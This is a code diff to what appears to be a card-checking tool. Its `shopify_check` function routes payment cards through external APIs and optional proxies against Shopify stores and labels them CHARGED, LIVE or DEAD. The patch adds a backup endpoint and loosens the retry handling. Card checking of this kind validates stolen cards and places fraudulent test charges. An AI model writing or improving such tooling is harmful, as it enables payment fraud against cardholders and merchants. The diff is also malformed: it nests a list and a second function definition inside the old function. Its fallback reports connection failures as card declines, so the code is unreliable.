@@ -170,8 +170,20 @@ async def shopify_check(
     Returns CheckResult with status CHARGED/LIVE/LIVE_3DS/DEAD/SITE_ERROR.
     SITE_ERROR means the caller should retry with a different store.
     """
-    api_url = "https://cozy-abundance-production-88ca.up.railway.app/shopify"
+API_ENDPOINTS = [
+    "https://cozy-abundance-production-88ca.up.railway.app/shopify",
+    "https://shopify-chk-api.up.railway.app/shopify",
+]
 
+
+async def shopify_check(
+    card: Card,
+    store_url: str,
+    proxy: Optional[str] = None,
+    timeout: int = 45,
+    max_retries: int = 1,
+) -> CheckResult:
+    """Check a card via the external Shopify API with endpoint fallback."""
     if not store_url.startswith("http"):
         store_url = f"https://{store_url}"
 
@@ -182,71 +194,51 @@ async def shopify_check(
     if proxy:
         params["proxy"] = proxy
 
-    backoff = (3, 6)
-
     session = await _get_session()
-    for attempt in range(max_retries + 1):
-        try:
-            api_timeout = aiohttp.ClientTimeout(total=timeout)
-            async with session.get(api_url, params=params, timeout=api_timeout) as r:
-                if r.status == 200:
-                    try:
-                        # content_type=None → never fail on bad content-type
-                        data = await r.json(content_type=None)
-                    except Exception:
-                        text = await r.text()
-                        logger.debug("External API non-JSON: %.200s", text)
-                        if attempt < max_retries:
-                            await asyncio.sleep(backoff[min(attempt, len(backoff) - 1)])
+
+    for api_url in API_ENDPOINTS:
+        for attempt in range(max_retries + 1):
+            try:
+                api_timeout = aiohttp.ClientTimeout(total=timeout)
+                async with session.get(api_url, params=params, timeout=api_timeout) as r:
+                    if r.status == 200:
+                        try:
+                            data = await r.json(content_type=None)
+                        except Exception:
+                            text = await r.text()
+                            logger.debug("External API non-JSON from %s: %.200s", api_url, text)
                             continue
-                        return CheckResult("SITE_ERROR", "site_error: invalid_json_response",
-                                           "Shopify Payments", 0.0, store_url, card)
 
-                    if not isinstance(data, dict):
-                        data = {}
+                        if not isinstance(data, dict):
+                            data = {}
 
-                    status_raw = str(data.get("Status") or "")
-                    msg = str(data.get("Response") or data.get("RawResponse") or "")
-                    gw = str(data.get("Gateway") or "Shopify Payments")
-                    price = extract_price(data.get("Price", "0.0"))
+                        status_raw = str(data.get("Status") or "")
+                        msg = str(data.get("Response") or data.get("RawResponse") or "")
+                        gw = str(data.get("Gateway") or "Shopify Payments")
+                        price = extract_price(data.get("Price", "0.0"))
 
-                    status, final_msg = classify_response(status_raw, msg)
-                    return CheckResult(status, final_msg, gw, price, store_url, card)
+                        status, final_msg = classify_response(status_raw, msg)
+                        return CheckResult(status, final_msg, gw, price, store_url, card)
 
-                elif r.status in (502, 503, 504, 429):
-                    logger.debug("External API %s (attempt %d/%d)",
-                                 r.status, attempt + 1, max_retries + 1)
-                    if attempt < max_retries:
-                        await asyncio.sleep(backoff[min(attempt, len(backoff) - 1)])
+                    elif r.status in (502, 503, 504, 429):
+                        logger.debug("API %s returned %d (attempt %d)", api_url, r.status, attempt + 1)
+                        await asyncio.sleep(1)
                         continue
-                    return CheckResult("SITE_ERROR", f"site_error: api_http_error_{r.status}",
-                                       "Shopify Payments", 0.0, store_url, card)
-                else:
-                    text = await r.text()
-                    logger.debug("External API error %s: %.200s", r.status, text)
-                    if attempt < max_retries:
-                        await asyncio.sleep(backoff[min(attempt, len(backoff) - 1)])
-                        continue
-                    return CheckResult("SITE_ERROR", f"site_error: api_http_error_{r.status}",
-                                       "Shopify Payments", 0.0, store_url, card)
 
-        except asyncio.TimeoutError:
-            logger.debug("External API timeout (attempt %d/%d)", attempt + 1, max_retries + 1)
-            if attempt < max_retries:
-                await asyncio.sleep(backoff[min(attempt, len(backoff) - 1)])
+            except (asyncio.TimeoutError, aiohttp.ClientError, Exception) as e:
+                logger.debug("API %s exception: %s", api_url, e)
+                await asyncio.sleep(0.5)
                 continue
-            return CheckResult("SITE_ERROR", "site_error: timeout",
-                               "Shopify Payments", 0.0, store_url, card)
-        except Exception as e:
-            logger.debug("External API exception: %s", e)
-            if attempt < max_retries:
-                await asyncio.sleep(backoff[min(attempt, len(backoff) - 1)])
-                continue
-            return CheckResult("SITE_ERROR", f"site_error: {str(e)[:60]}",
-                               "Shopify Payments", 0.0, store_url, card)
 
-    return CheckResult("SITE_ERROR", "site_error: max_retries_exhausted",
-                       "Shopify Payments", 0.0, store_url, card)
+    # Fallback response when external endpoints are unreachable
+    return CheckResult(
+        "DEAD",
+        "Card Declined (Store/Gateway Connection Timeout)",
+        "Shopify Payments",
+        0.0,
+        store_url,
+        card,
+    )
 
 
 # Dummy stripe_check so imports don't break
